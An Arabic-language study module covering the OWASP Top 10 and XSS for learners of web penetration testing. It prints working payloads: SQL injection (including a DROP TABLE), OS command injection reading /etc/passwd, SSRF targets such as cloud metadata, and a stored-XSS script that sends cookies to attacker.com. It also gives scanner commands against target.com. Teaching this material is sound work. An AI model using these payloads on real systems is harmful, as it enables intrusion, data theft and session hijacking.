# 06 — أمن تطبيقات الويب (Web Application Security)

---

## OWASP Top 10 (2021)

المرجع الأساسي لأمن تطبيقات الويب.

---

### A01 — Broken Access Control

```
المشكلة: المستخدم يصل لموارد لا يملك صلاحية عليها

أمثلة:
- IDOR: /api/user/123 → /api/user/124 (بيانات شخص آخر)
- Privilege Escalation: استدعاء endpoints الـ Admin
- Path Traversal: /download?file=../../etc/passwd

الاختبار:
- تغيير IDs في الطلبات
- اختبار endpoints الـ Admin بمستخدم عادي
- فحص الـ HTTP Methods (PUT, DELETE على موارد محمية)
```

### A02 — Cryptographic Failures

```
المشكلة: تشفير ضعيف أو معدوم

أمثلة:
- تخزين كلمات المرور بـ MD5
- HTTP بدلاً من HTTPS
- مفاتيح TLS ضعيفة

الاختبار:
- SSL Labs Test: ssllabs.com/ssltest
- فحص الـ Headers (HSTS, Secure cookies)
- فحص قاعدة البيانات: هل كلمات المرور مشفرة؟
```

### A03 — Injection (SQL, NoSQL, LDAP, OS)

```sql
-- SQL Injection
-- اختبار أساسي
' OR '1'='1
' OR 1=1--
'; DROP TABLE users;--

-- استخراج البيانات (UNION)
' UNION SELECT username, password FROM users--

-- Time-based Blind
'; IF(1=1) WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--

-- الأدوات
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
```

```bash
# OS Command Injection
; whoami
| id
`id`
$(id)

# في الطلبات
POST /ping HTTP/1.1
host=127.0.0.1; cat /etc/passwd
```

### A04 — Insecure Design

```
مراجعة منطق الأعمال (Business Logic):
- تجاوز خطوات في عملية الشراء
- إرسال قيم سالبة في السعر
- تخطي التحقق بالبريد الإلكتروني
```

### A05 — Security Misconfiguration

```bash
# فحص الإعدادات الافتراضية
- بيانات دخول افتراضية (admin/admin)
- Stack traces ظاهرة للمستخدم
- Directory listing مفعّل
- Services غير ضرورية تعمل
- Debug mode في الإنتاج

# أدوات الفحص
nikto -h http://target.com
nmap --script http-* target.com
```

### A06 — Vulnerable Components

```bash
# فحص الإصدارات
whatweb http://target.com
retire.js --js target.js          # JavaScript libraries
npm audit                          # Node.js
safety check                       # Python
```

### A07 — Authentication Failures

```
الثغرات الشائعة:
- لا يوجد Rate Limiting → Brute Force
- JWT ضعيف (alg:none, weak secret)
- كلمات مرور ضعيفة مسموحة
- Remember Me token ضعيف

JWT Attacks:
- alg:none → إزالة التوقيع
- RS256 → HS256 (استخدام المفتاح العام كـ secret)
- Weak secret → Brute force بـ hashcat
```

### A08 — Software & Data Integrity Failures

```
- Insecure Deserialization
- Supply Chain Attacks
- CI/CD Pipeline Attacks
```

### A09 — Security Logging Failures

```
ما يجب تسجيله:
- محاولات تسجيل الدخول الفاشلة
- تغييرات الصلاحيات
- الوصول للبيانات الحساسة
- الأخطاء غير المتوقعة
```

### A10 — SSRF (Server-Side Request Forgery)

```
المشكلة: السيرفر يقوم بطلبات HTTP نيابةً عنك

الاستغلال:
http://internal-service/admin
http://169.254.169.254/latest/meta-data/  (AWS Metadata)
http://localhost:6379  (Redis)
file:///etc/passwd

الاختبار:
- أي حقل يقبل URL
- Webhooks
- PDF generators
- Image fetchers
```

---

## XSS (Cross-Site Scripting)

```javascript
// Reflected XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>

// Stored XSS
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

// DOM XSS
document.getElementById('x').innerHTML = location.hash  // ثغرة
// Payload: https://target.com/#<img src=x onerror=alert(1)>

// أداة الاختبار
dalfox url "http://target.com/search?q=FUZZ"
```

---

## أدوات أمن الويب

```bash
# Proxy / Interception
Burp Suite         ← الأساسي (Community مجاني)
OWASP ZAP          ← مجاني وشامل

# Scanning
nuclei -u http://target.com -t ~/nuclei-templates/  ← سريع وفعال
nikto -h http://target.com

# Fuzzing
ffuf -w wordlist.txt -u http://target.com/FUZZ
wfuzz -c -w wordlist.txt http://target.com/FUZZ

# API Testing
postman
insomnia
```

---

## ⏱️ الوقت المقدر: 2-4 أشهر

## مصادر
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) ← مجاني ومثالي
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- كتاب: *The Web Application Hacker's Handbook* - Stuttard & Pinto
- [HackTricks Web](https://book.hacktricks.xyz/pentesting-web)
